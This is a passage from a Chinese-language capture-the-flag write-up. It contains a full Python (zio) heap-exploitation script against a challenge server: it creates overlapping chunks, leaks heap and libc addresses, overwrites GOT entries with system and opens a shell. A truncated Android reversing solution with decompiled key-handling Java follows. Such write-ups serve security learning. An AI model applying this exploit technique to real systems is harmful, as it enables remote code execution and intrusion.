    c = malloc(0x208);
    free(b);
    a[0x208] = 0x0;
    d = malloc(0x80);
    e = malloc(0x80);
    free(d);
    free(c);
    f = malloc(0x208); // f and e are overlapping chunks
    ```
    #### Exploit
    ```python
    from zio import *
    io = zio(('119.28.62.216', 10024), print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 100000)
    io.hint([0x400e16])
    adr_control = 0x6030b8
    io.wl_af('?', 'y')
    io.wls_af(':', [1, '/bin/sh', 'BBBB'])
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
    io.wls_af(':', [2, 0x1f0, 'aaaa'])
    io.wls_af(':', [2, 0x1f0, 'aaaa'])
    io.wls_af(':', [2, 0x1f0, 'dddd'])
    io.wls_af(':', [3, 2])
    io.wls_af(':', [3, 1])
    io.wls_af(':', [2, 0x1f0, 'b' * 0x1f0])     # shrink free chunk
    io.wl_af(':', 5)
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
    io.wl_af(':', 5)
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
    io.wl_af(':', 5)
    # overlap
    io.wls_af(':', [4, 2])
    io.wls_af(':', [4, 1])
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
    io.wls_af(':', [3, 1])
    io.wls_af(':', [2, 0x1f0, 'b' * 0x98 + l64(0x0) + l64(0x81) + l64(adr_control - 0x20)])
    io.wl_af(':', 5)
    io.wl_af(':', 5)
    io.rtl('======receiver[2]=======')
    io.rtl('postcodes:')
    heap_base = l64(io.rl()[0:-1].ljust(0x8, 'x00')) - 0x10
    print '[+] heap baset:0x%x' % heap_base
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
    io.wls_af(':', [3, 0])
    io.wls_af(':', [2, 0x1f0, 'd' * 0x98 + l64(0x0) + l64(0x81) + l64(0x603000 - 0x18)])
    io.wl_af(':', 5)
    io.wl_af(':', 5)
    io.rtl('======receiver[3]=======')
    io.rtl('contact:')
    adr_free    = l64(io.r(6).ljust(0x8, 'x00'))
    off_free    = 0x0000000000083c30
    off_read    = 0x00000000000ec690
    off_puts    = 0x0000000000070c70
    off_malloc  = 0x0000000000083590
    libc_base   = adr_free - off_free
    off_system  = 0x00000000000468f0
    adr_system  = off_system + libc_base
    adr_puts    = off_puts + libc_base
    adr_read    = off_read + libc_base
    adr_malloc  = off_malloc + libc_base
    print '[+] free addresst:0x%x' % adr_free
    print '[+] system addresst:0x%x' % adr_system
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
    io.wls_af(':', [3, 0])
    io.wls_af(':', [2, 0x1f0, 'd' * 0x98 + l64(0x0) + l64(0x81) + l64(heap_base)])
    io.wl_af(':', 5)
    io.wls_af(':', [3, 4]),
    io.w(l64(0x603008) + l64(heap_base + 0x40)[0:7] + 'n' + 'B' * 0x8 + 'C' * 0x38)
    io.wls_af(':', [3, 0])
    io.w(l64(adr_system)[0:7] + 'n' + l64(adr_puts)[0:7] + 'n' + l64(adr_read)[0:7] + 'n' + l64(adr_malloc) + 'D' * 0x20 + l64(adr_system)[0:7] + 'n')
    io.wl('sh')
    io.wl('6')
    io.itr()
**  
**
**Misc**
**moblie 100**
这一题的确是个福利题…并没有涉及到dex函数隐藏等小技巧，只是简单的使用proguard进行了混淆。可以静态也可动态（动态先改掉debug检测，还不如直接静态看一下），那么，关键部分源码：
    private void getKey(){
        try {
            InputStream stream = this.getResources().getAssets().open("url.png");
            int v = stream.available();
            byte[] bs = new byte[v];
            stream.read(bs, 0, v);
            byte[] keybyte = new byte[16];
            System.arraycopy(bs, 144, keybyte, 0, 16);
            this.key = new String(keybyte, "utf-8");
        }
        catch (Exception e){
            e.printStackTrace();
        }
        //code
    }
    private String handle(String naive){
        try {
            naive.getBytes("utf-8");
            StringBuilder str = new StringBuilder();
            for (int i = 0; i < naive.length(); i += 2) {
                str.append(naive.charAt(i + 1));
                str.append(naive.charAt(i));
            }
            return str.toString();
        }catch (UnsupportedEncodingException e){
            e.printStackTrace();
        }
        return null;
    }        
    protected void Encryption(byte[] key){
        try {
            if (key == null) {
                byte[] bytes = "".getBytes("utf-8");
                MessageDigest messageDigest = MessageDigest.getInstance("MD5");
                byte[] bytes1 = messageDigest.digest(bytes);